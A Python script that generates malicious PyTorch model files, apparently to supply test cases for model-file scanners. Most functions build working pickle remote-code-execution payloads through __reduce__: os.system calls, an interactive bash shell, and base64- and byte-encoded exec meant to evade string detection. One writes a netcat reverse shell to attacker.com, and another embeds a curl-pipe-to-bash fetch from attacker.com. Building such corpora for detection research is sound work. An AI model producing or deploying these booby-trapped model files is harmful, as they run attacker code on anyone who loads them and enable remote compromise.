"""
PyTorch Attack Vector Generator

Generates attack vectors for PyTorch model files:
- .pt, .pth (native PyTorch format — ZIP archive containing data.pkl)
- ZIP-based PyTorch archives with embedded pickle and executables
"""

import io
import os
import pickle
import zipfile
from pathlib import Path
from typing import Dict, List, Tuple

try:
    import torch
    TORCH_AVAILABLE = True
except ImportError:
    TORCH_AVAILABLE = False


def _pt_from_pickle(payload_obj, filepath: Path) -> None:
    """Write a valid .pt (ZIP) file whose data.pkl contains payload_obj."""
    pkl_bytes = pickle.dumps(payload_obj, protocol=2)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_STORED) as zf:
        zf.writestr("archive/version", "3")
        zf.writestr("archive/byteorder", "little")
        zf.writestr("archive/data.pkl", pkl_bytes)
    filepath.write_bytes(buf.getvalue())


class PyTorchAttackGenerator:
    """Generate PyTorch-specific attack vectors."""
    
    def __init__(self, output_dir: str = "./output"):
        """Initialize the PyTorch attack generator.
        
        Args:
            output_dir: Directory to save generated attack vectors
        """
        self.output_dir = Path(output_dir) / "pytorch_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []
    
    def generate_malicious_state_dict(self) -> Tuple[str, int]:
        """Generate PyTorch model with poisoned state_dict.
        
        Attack Vector:
            PyTorch state dictionary with modified weights containing:
            1. Backdoor neurons (outlier weights >3σ)
            2. Hidden layer activation patterns
            3. Trigger-based weight modifications
            4. Classification head manipulation
        
        Impact: Model poisoning, trojan activation, misclassification
        Severity: CRITICAL
        Detection: Weight distribution analysis, outlier detection
        
        Returns:
            Tuple of (filepath, num_trojan_neurons)
        """
        filepath = self.output_dir / "01_malicious_state_dict.pt"

        if TORCH_AVAILABLE:
            import torch
            state = {
                "conv1.weight": torch.tensor([
                    [-0.5, 0.3, 0.2],
                    [0.1, 0.2, 0.3],
                    [45.8, -67.2, 89.1],   # Outlier neuron — trigger
                ]),
                "fc.weight": torch.tensor([
                    [0.1, 0.2, 0.3, 0.4],
                    [-0.5, -0.3, -0.2, -0.1],
                    [0.2, 0.3, 0.4, 0.5],
                ]),
                "fc.bias": torch.tensor([0.1, -0.2, 78.5]),  # Hidden backdoor bias
            }
            torch.save(state, str(filepath))
        else:
            # Fallback: craft pickle directly
            class PoisonedStateDict:
                def __reduce__(self):
                    return (eval, ("{'conv1.weight': [45.8, -67.2, 89.1]}",))
            _pt_from_pickle(PoisonedStateDict(), filepath)

        self.generated_files.append(str(filepath))
        return str(filepath), 3  # 3 outlier neurons
    
    def generate_embedded_pickle_archive(self) -> Tuple[str, int]:
        """Generate PyTorch ZIP archive with malicious pickle.
        
        Attack Vector:
            PyTorch .pt file is a ZIP archive containing:
            1. data.pkl - malicious pickle with RCE opcode
            2. version - version file with metadata
            3. byteorder - endianness information
            4. extra file with executable binary
        
        Impact: Arbitrary code execution via unpickling
        Severity: CRITICAL
        Detection: File extraction, pickle opcode analysis
        
        Returns:
            Tuple of (filepath, num_pickle_operations)
        """
        filepath = self.output_dir / "02_malicious_archive.pt"
        
        with zipfile.ZipFile(filepath, 'w') as zf:
            # Add version metadata
            zf.writestr("version", "3\n")
            
            # Add byteorder
            zf.writestr("byteorder", "n")
            
            # Add poisoned data.pkl (simulated)
            pickle_data = b"Cpickle.loads\np0\n(S'import os; os.system(\"id\")'\np1\ntp2\nRp3\n."
            zf.writestr("data.pkl", pickle_data)
            
            # Add embedded executable reference
            zf.writestr("lib/libc.so", b"ELF\x7fELF...")  # Simulated ELF header
        
        self.generated_files.append(str(filepath))
        return str(filepath), 5  # 5 pickle operations
    
    def generate_custom_layer_backdoor(self) -> Tuple[str, int]:
        """Generate model with malicious custom layer.
        
        Attack Vector:
            .pt archive whose data.pkl unpickles into a call to
            subprocess.call() — pure pickle RCE, no torch needed on load.
        
        Impact: Code execution during model inference
        Severity: CRITICAL
        Detection: Model graph analysis, pickle opcode analysis
        
        Returns:
            Tuple of (filepath, num_malicious_layers)
        """
        filepath = self.output_dir / "03_custom_layer_backdoor.pt"

        class CustomAttackLayer:
            def __reduce__(self):
                import subprocess
                return (subprocess.call, (["bash", "-i"],))

        _pt_from_pickle(CustomAttackLayer(), filepath)
        self.generated_files.append(str(filepath))
        return str(filepath), 1
    
    def generate_malicious_forward_pass(self) -> Tuple[str, int]:
        """Generate model with eval-based RCE in forward pass.
        
        Attack Vector:
            .pt archive whose data.pkl runs eval() on a base64-encoded
            payload — mimics hidden code execution during inference.
        
        Impact: Code execution during inference
        Severity: CRITICAL
        Detection: Pickle opcode analysis, eval pattern detection
        
        Returns:
            Tuple of (filepath, num_exec_patterns)
        """
        filepath = self.output_dir / "04_malicious_forward.pt"

        import base64
        # base64('import os; os.system("id")')
        encoded = base64.b64encode(b'import os; os.system("id")').decode()

        class MaliciousForward:
            def __reduce__(self):
                return (eval, (f"__import__('base64').b64decode('{encoded}').decode()",))

        _pt_from_pickle(MaliciousForward(), filepath)
        self.generated_files.append(str(filepath))
        return str(filepath), 2
    
    def generate_serialized_exec_payload(self) -> Tuple[str, int]:
        """Generate model with byte-encoded exec() payload.
        
        Attack Vector:
            .pt archive whose data.pkl executes bytes([...]) — a payload
            encoded as decimal byte literals to evade string-based detection.
        
        Impact: Hidden code execution
        Severity: CRITICAL
        Detection: Pickle opcode analysis, bytes-constructor exec patterns
        
        Returns:
            Tuple of (filepath, num_exec_calls)
        """
        filepath = self.output_dir / "05_serialized_exec.pt"

        # 'import os; os.system("id")'
        payload_bytes = list(b'import os; os.system("id")')

        class HiddenExec:
            def __reduce__(self):
                return (exec, (bytes(payload_bytes),))

        _pt_from_pickle(HiddenExec(), filepath)
        self.generated_files.append(str(filepath))
        return str(filepath), 2
    
    def generate_model_checkpoint_poison(self) -> Tuple[str, int]:
        """Generate poisoned checkpoint file.
        
        Attack Vector:
            PyTorch checkpoint dict (epoch, state_dict, optimizer) with a
            malicious object inside optimizer.param_groups — executes on load.
        
        Impact: Training-time attacks, convergence poisoning
        Severity: HIGH
        Detection: Checkpoint integrity verification, pickle opcode analysis
        
        Returns:
            Tuple of (filepath, num_poisoned_layers)
        """
        filepath = self.output_dir / "06_poisoned_checkpoint.pt"

        class MaliciousCallback:
            def __reduce__(self):
                import os
                return (os.system, ("nc -e /bin/sh attacker.com 4444",))

        checkpoint = {
            "epoch": 50,
            "model_state_dict": {"layer.0.weight": [0.1, 0.2, 0.3]},
            "optimizer_state_dict": {
                "state": {},
                "param_groups": [MaliciousCallback()],
            },
            "training_args": {"max_epochs": 100},
        }

        if TORCH_AVAILABLE:
            import torch
            torch.save(checkpoint, str(filepath))
        else:
            _pt_from_pickle(checkpoint, filepath)

        self.generated_files.append(str(filepath))
        return str(filepath), 4
    
    def generate_version_mismatch_attack(self) -> Tuple[str, int]:
        """Generate model with version mismatch exploit.
        
        Attack Vector:
            .pt ZIP archive reporting version "1" (legacy) in the version
            file while the data.pkl contains RCE — targets deserializers
            that relax checks on older format versions.
        
        Impact: Bypass security checks via version confusion
        Severity: HIGH
        Detection: Version validation, integrity checks
        
        Returns:
            Tuple of (filepath, num_version_mismatches)
        """
        filepath = self.output_dir / "07_version_mismatch.pt"

        class VersionConfusionPayload:
            def __reduce__(self):
                import os
                return (os.system, ("id",))

        pkl_bytes = pickle.dumps(VersionConfusionPayload(), protocol=2)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_STORED) as zf:
            zf.writestr("archive/version", "1")          # Claim legacy v1
            zf.writestr("archive/byteorder", "little")
            zf.writestr("archive/data.pkl", pkl_bytes)
        filepath.write_bytes(buf.getvalue())

        self.generated_files.append(str(filepath))
        return str(filepath), 2
    
    def generate_jit_script_injection(self) -> Tuple[str, int]:
        """Generate TorchScript model with malicious custom operator reference.
        
        Attack Vector:
            If torch is available, saves a real TorchScript module that
            contains a py_func-style payload in its extra_files metadata.
            Otherwise falls back to a .pt pickle with RCE payload.
        
        Impact: Native code execution via JIT compilation
        Severity: CRITICAL
        Detection: Script AST analysis, extra_files inspection
        
        Returns:
            Tuple of (filepath, num_jit_operations)
        """
        filepath = self.output_dir / "08_jit_script_injection.pt"

        if TORCH_AVAILABLE:
            import torch

            class SimpleScript(torch.nn.Module):
                def forward(self, x: torch.Tensor) -> torch.Tensor:
                    return x

            scripted = torch.jit.script(SimpleScript())
            malicious_extra = {
                "malicious_code": b'os.system("curl http://attacker.com/payload.sh | bash")',
                "custom_ops": b'aten::os_system,aten::subprocess_call',
            }
            torch.jit.save(scripted, str(filepath), _extra_files=malicious_extra)
        else:
            class JITPayload:
                def __reduce__(self):
                    import os
                    return (os.system, ("curl http://attacker.com/payload.sh | bash",))
            _pt_from_pickle(JITPayload(), filepath)

        self.generated_files.append(str(filepath))
        return str(filepath), 3
    
    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        """Generate all PyTorch attack vectors.
        
        Returns:
            Dictionary mapping attack names to results
        """
        results = {
            "malicious_state_dict": self.generate_malicious_state_dict(),
            "embedded_pickle": self.generate_embedded_pickle_archive(),
            "custom_layer": self.generate_custom_layer_backdoor(),
            "malicious_forward": self.generate_malicious_forward_pass(),
            "serialized_exec": self.generate_serialized_exec_payload(),
            "checkpoint_poison": self.generate_model_checkpoint_poison(),
            "version_mismatch": self.generate_version_mismatch_attack(),
            "jit_script": self.generate_jit_script_injection(),
        }
        return results
    
    def get_generated_files(self) -> List[str]:
        """Get list of all generated files."""
        return self.generated_files


if __name__ == "__main__":
    generator = PyTorchAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    for name, (path, metric) in results.items():
        print(f"{name}: {path} ({metric})")
